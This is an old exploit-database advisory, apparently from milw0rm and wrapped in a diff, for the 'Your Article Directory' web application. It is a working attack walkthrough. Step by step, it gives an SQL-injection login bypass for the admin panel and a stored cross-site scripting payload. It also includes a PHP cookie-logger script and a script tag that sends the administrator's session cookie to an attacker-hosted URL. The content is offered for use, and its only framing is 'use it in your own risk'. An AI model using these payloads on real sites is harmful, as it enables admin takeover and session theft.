@@ -1,0 +1,52 @@
+  ___ ___         __                        
+ /   |   \_____  |  | _____  ___ ___________
+/    ~    \__  \ |  |/ /\  \/  // __ \_  __ \
+\    Y    // __ \|    <  >    <\  ___/|  | \/
+ \___|_  /(____  /__|_ \/__/\_ \\___  >__|  
+       \/      \/     \/      \/    \/   :: Egy Coders Team Researcher
+/- Your Article Directory => multiple vulnerabilities
+/- site : http://www.yourarticlesdirectory.com
+/- Demo : http://www.ezynearticles.com/designs/demo/yad-admin
+/- Greetz : all my friends
+/- http://hakxer.blogspot.com/
+
+* hi every body
+* in this vulnerability you can get Authentication to bypass admin panel
+* first go to http://host/path/yad-admin/
+* and in admin type
+ * username : admin 'or' 1=1
+ * password : hakxer
+* now we in panel
+* you can make a cross site scripting vulnerability in panel
+* go to http://host/path/yad-admin/newpage.php
+* then in title write anything and in content write
+ * >"<script>alert("hakxer")</script><div style="1
+* and click save page and go to http://host/path/yad-admin/pages.php
+* and goto this http://host/path/yad-admin/newpages.php?id=[id]
+* xss was running successfully
+
+* if you want to get the admin cookie
+* you can use cookie grabber and to make it you can see this steps :
+         * first make file ( logger.php ) and input this code in it
+              <?php
+            $cookie = $_GET['cookie'];
+            $logger = fopen("logger.txt", "a");
+            fwrite($logger, $cookie ."\n");
+            fclose($logger);
+            ?>
+         * and upload file into any webhost
+         * then create logger.txt and chmod it to 777
+         * now the time to attack
+         * goto http://host/path/yad-admin/newpage.php
+         * and in title write ( blah blah come admin ) :d
+         * and in content write this js code
+    <script>document.location ="http://host/path/logger.php?cookie=" + document.cookie;</script>
+         * and click save page
+         * now if admin go to our saved page the cookie will send to logger.txt
+
+** notes :
+        ** use it in your own risk
+       
+./be safe - Hakxer -
+
+# milw0rm.com [2009-05-21]
